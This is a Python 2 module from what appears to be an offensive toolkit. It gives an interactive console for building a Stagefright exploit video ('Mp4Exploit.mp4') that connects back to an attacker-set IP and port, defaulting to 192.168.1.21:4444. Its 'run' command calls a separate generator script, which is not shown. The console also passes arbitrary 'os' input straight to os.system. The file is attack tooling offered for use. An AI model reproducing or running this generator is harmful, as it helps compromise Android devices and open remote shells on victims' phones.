#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
Module Exploit And Exploit With Metasploit Framework
Created by ~xGans
Facebook : https://web.facebook.com/ichsan.AndroSec
Gmail : Exsandrrt01@gmail.com
you can report bug on my email
'''

import os
import subprocess
from core import wcolors
from core import help
from time import sleep
from core import about
from core import log
options = ["192.168.1.21", "4444"]
def mp4exploit():
    try:
        line_1 = wcolors.color.RED + "[" + wcolors.color.CYAN + "XioChi" + wcolors.color.RED + "]" +  wcolors.color.ENDC
        line_1 += wcolors.color.RED + "[" + wcolors.color.CYAN + "exploit/stagefright" + wcolors.color.RED + "]>> " + wcolors.color.ENDC
        com = raw_input(line_1)
        com = com.lower()
        if com[0:6] =='set ip':
            dork = com[7:40]
            options[0] = dork
            print wcolors.color.RED + "[" + wcolors.color.CYAN + "Ip Addres" + wcolors.color.RED + "]>> " +wcolors.color.YELLOW+ options[0]
            mp4exploit()
        elif com[0:8] =='set port':
            pages = com[9:40]
            options[1] = pages
            print wcolors.color.RED + "[" + wcolors.color.CYAN + "Port" + wcolors.color.RED + "]>> " +wcolors.color.YELLOW+ options[1]
            mp4exploit()
        elif com[0:12] =='show options':
            print(wcolors.color.YELLOW + 26 * "#" +wcolors.color.RED+"[ Options List ]"+wcolors.color.YELLOW+ 26 * "#")
            print wcolors.color.CYAN+"Options\t\t Value\t\t\t Description"
            print wcolors.color.RED+"---------\t--------------\t\t------------------"
            print wcolors.color.CYAN+"Ip\t\t"+options[0]+"\tTarget IP Address(your Ip)"
            print "Port\t\t"+options[1]+"\t\t\tPort Backconnet(you want)"
            print(wcolors.color.YELLOW + 68 * "#"+wcolors.color.ENDC)
            mp4exploit()
        elif com[0:2] =='os':
            log.logger.single("Command Executed", "\n"+wcolors.color.CYAN)
            os.system(com[3:])
            mp4exploit()
        elif com[0:4] =='help':
            help.help()
            mp4exploit()
        elif com[0:4] =='back':
            pass
        elif com[0:5] =='about':
            about.about()
            mp4exploit()
        elif com[0:3] =='run':
            log.logger.attack("Starting  Creating!!")
            subprocess.Popen('python metamodules/mp4.py -c %s -p %s -o output/Mp4Exploit.mp4>/dev/null' %(options[0], options[1]), shell=True).wait()
            sleep(1)
            asdas = subprocess.check_output('echo [ ${PWD}/output/Mp4Exploit.mp4 ]', shell=True)
            log.logger.single("Done", "   "+asdas)
            print ""
            mp4exploit()
        else:
            print wcolors.color.RED + "[" + wcolors.color.CYAN + "Wrong Command" + wcolors.color.RED + "]>> " + com
            mp4exploit()
    except(KeyboardInterrupt):
        print ""
